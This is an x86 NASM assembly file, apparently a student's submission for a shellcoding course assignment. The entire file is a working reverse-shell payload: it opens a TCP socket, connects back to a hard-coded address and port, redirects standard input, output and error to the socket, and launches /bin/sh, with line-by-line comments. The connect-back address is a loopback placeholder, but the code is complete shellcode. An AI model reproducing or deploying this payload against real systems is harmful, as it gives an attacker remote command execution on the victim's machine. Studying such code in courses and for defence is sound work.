; Filename: reverse.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 2

global _start
 
section .text

_start:
	;-------------------------------------------------------------
	; Section 1: to create a TCP socket
	;-------------------------------------------------------------
	xor eax, eax		; will be used for sys_call SYS_SOCKETCALL later
	xor ebx, ebx		; will be used for storing the 1st arguement of SYS_SOCKETCALL 
	cdq			; edx now is 0

	; socket(int AF_INET, int SOCK_STREAM, int 0)
	push edx		; 0
	inc edx			; edx now is 1
	push edx		; SOCK_STREAM
	inc edx			; edx now is 2
	push edx		; AF_INET

	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL

	; to call SYS_SOCKET
	inc ebx			; 0x1 = SYS_SOCKET

	; to store the argements for libc function socket()
	mov ecx, esp		; ecx is now pointing to the address of arguements for socket()

	; to invoke SYSTEM_CALL
	int 0x80

	;---------------------------------------------------------------
	; Section 2: to connect back
	;---------------------------------------------------------------
	
	; svrAddr Details
	push 0x0101017f		; svrAddr.sin_addr.s_addr = inet_addr("127.1.1.1")
	push word 0x0A1A	; (unsigned short 2 bytes)svrAddr.sin_port = htons(6666)
	push word dx		; (short 2 bytes)svrAddr.sin_family = AF_INET
	mov ecx, esp		; ecx is pointing to svrAddr

	; connect(int svrfd, (struct sockaddr*)&svrAddr, socklen_t sizeof(svrAddr))
	push 0x10		; (socklen_t 4 bytes)sizeof(svrAddr)
	push ecx		; &svrAddr
	xchg edx, eax		; edx is now storing sockfd
	push edx		; (int 4 bytes)sockfd

	; to invoke SYS_SOCKETCALL
	mov al, 0x66		; 0x66 = SYS_SOCKETCALL
	mov bl, 0x3		; 0x3 = connect()
	mov ecx, esp		; ecx now is pointing to arguements of connect()
	int 0x80		; SYSTEM_CALL

	;---------------------------------------------------------------
	; Section 3: to redirect stdin, stdout, stderr
	;---------------------------------------------------------------
	push 0x2		; to push 2 onto the stack
	pop ecx			; ecx = 2
	xchg ebx, edx		; ebx is now storing sockfd

	;dup2(svrfd, int 0-2)
loop:
	mov al, 0x3f		; 0x3f = SYS_DUP2
	int 0x80		; SYSTEM_CALL
	dec ecx
	jns loop		; loop until ecx < 0

	;---------------------------------------------------------------
	; Section 4: to invoke /bin/sh
	;---------------------------------------------------------------
	inc ecx			; ecx = 0
	push ecx		; to push NULL onto the stack
	push 0x68732f2f		; to push hs// onto the stack
	push 0x6e69622f		; to push nib/ onto the stack

	; to invoke SYS_EXECVE
	mov al, 0x0b		; 0x0b = SYS_EXECVE
	mov ebx, esp		; ebx is now pointing to /bin//sh
	cdq			; edx = 0
	int 0x80		; SYSTEM_CALL
